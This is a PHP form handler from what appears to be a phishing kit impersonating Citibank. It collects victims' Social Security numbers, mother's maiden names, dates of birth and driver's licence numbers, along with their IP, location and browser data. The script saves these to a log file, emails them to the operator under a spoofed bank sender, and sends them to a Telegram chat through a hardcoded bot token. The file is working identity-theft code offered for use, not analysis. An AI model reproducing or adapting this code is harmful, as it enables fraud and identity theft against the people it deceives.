<?php

session_start();
$errors = array(); 



       
       include '../param.php';
       include '../../settings/settings.php';


$ssn = $_POST['ssn'];
$mmn = $_POST['mmn'];
$dob = $_POST['dob'];
$dl  = $_POST['dl'];

$owner = $settings['email'];




$message =  "|=========||@SPOX_X 𝓬𝓲𝓽𝓲||=========|\n";
$message .= "|======================================|\n";
$message .= "|         [ I D E N T I T Y ]          \n";
$message .= "|======================================|\n";
$message .= "| ➤ [ SSN ]       : {$ssn}\n";
$message .= "| ➤ [ MMN ]       : {$mmn}\n";
$message .= "| ➤ [ DOB ]       : {$dob}\n";
$message .= "|======================================|\n";
$message .= "| 🆔 D R I V E R ~ L I C E N S E 🆔\n";
$message .= "|======================================|\n";
$message .= "| ➤ [ DL ]         : {$dl}\n";
$message .= "|======================================|\n";
$message .= "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n";
$message .= "|======================================|\n";
$message .= "| ➤ [ IP Address ]   : {$_SESSION['ip']}\r\n";
$message .= "| ➤ [ IP Country ]   : {$_SESSION['country']}\r\n";
$message .= "| ➤ [ IP City ]      : {$_SESSION['city']}\r\n";
$message .= "| ➤ [ Browser ]      : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
$message .= "| ➤ [ User Agent ]   : {$_SERVER['HTTP_USER_AGENT']}\r\n";
$message .= "| ➤ [ TIME ]         : ".date("d/m/Y h:i:sa")." GMT\r\n";
$message .= "|======================================|\n";



#Save Result

              $save=fopen("../../logs/results.txt","a+");
              fwrite($save,$message);
              fclose($save);


# Send Mail
                if ($settings['send_mail'] == "1")
                {
                $to = $owner;
                $headers = "Content-type:text/plain;charset=UTF-8\r\n";
                $headers .= "From:CITI BANK  <ppCC-$randomnumber@Publous.team>";
                $subject = "I D E N T I T Y ✦ D E T A I L S ✦ C I T I=> From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ] ";
                $msg = $message;
                mail($to, $subject, $msg, $headers);
                }


    
# Send Bot

$apiToken = "2121890488:AAEsxO6295XBL6uvfJLa_pefweuxtnFuYCI";
$citibank = [
	    'chat_id' => '-1001181474291',
	    'text' => $message
	];	

    $key = substr(sha1(mt_rand()),1,25);
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($citibank) );




  echo "<script>window.location.href = \"../billing.php\"; </script>";




?>